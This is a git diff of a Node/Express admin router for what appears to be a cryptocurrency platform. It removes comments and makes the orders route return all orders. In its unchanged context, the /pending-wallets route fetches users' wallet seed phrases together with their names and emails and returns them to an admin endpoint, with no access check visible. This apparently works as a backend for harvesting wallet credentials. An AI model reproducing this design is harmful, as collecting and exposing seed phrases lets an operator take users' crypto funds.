@@ -4,9 +4,6 @@ const User = require("../models/User");
 const Order = require("../models/Order");
 const Settings = require("../models/Settings");
 
-// ==============================
-// 1. PUBLIC SETTINGS ROUTE (For users to see addresses)
-// ==============================
 router.get("/public/settings", async (req, res) => {
     try {
         let settings = await Settings.findOne();
@@ -15,9 +12,6 @@ router.get("/public/settings", async (req, res) => {
     } catch (e) { res.status(500).json({ message: "Error fetching settings" }); }
 });
 
-// ==============================
-// 2. WALLET ROUTES
-// ==============================
 router.get("/pending-wallets", async (req, res) => {
     try {
         const users = await User.find({ walletStatus: "pending" }).select("name email walletAddress seedPhrase");
@@ -35,12 +29,9 @@ router.post("/approve-wallet/:email", async (req, res) => {
     } catch (e) { res.status(500).json({ message: "Error approving wallet" }); }
 });
 
-// ==============================
-// 3. ORDER ROUTES
-// ==============================
 router.get("/pending-orders", async (req, res) => {
     try {
-        const orders = await Order.find({ status: "Pending" });
+        const orders = await Order.find({}).sort({ _id: -1 });
         res.json(orders);
     } catch (e) { res.status(500).json({ message: "Error fetching orders" }); }
 });
@@ -55,9 +46,6 @@ router.post("/approve-order/:id", async (req, res) => {
     } catch (e) { res.status(500).json({ message: "Error approving order" }); }
 });
 
-// ==============================
-// 4. ADMIN SETTINGS ROUTES
-// ==============================
 router.get("/settings", async (req, res) => {
     try {
         let settings = await Settings.findOne();
@@ -71,10 +59,8 @@ router.post("/settings", async (req, res) => {
         const { supportEmail, wallets } = req.body;
         let settings = await Settings.findOne();
         if (!settings) settings = new Settings({});
-        
         settings.supportEmail = supportEmail || settings.supportEmail;
         settings.wallets = wallets || {};
-        
         await settings.save();
         res.json({ message: "Settings updated successfully" });
     } catch (e) { res.status(500).json({ message: "Error updating settings" }); }
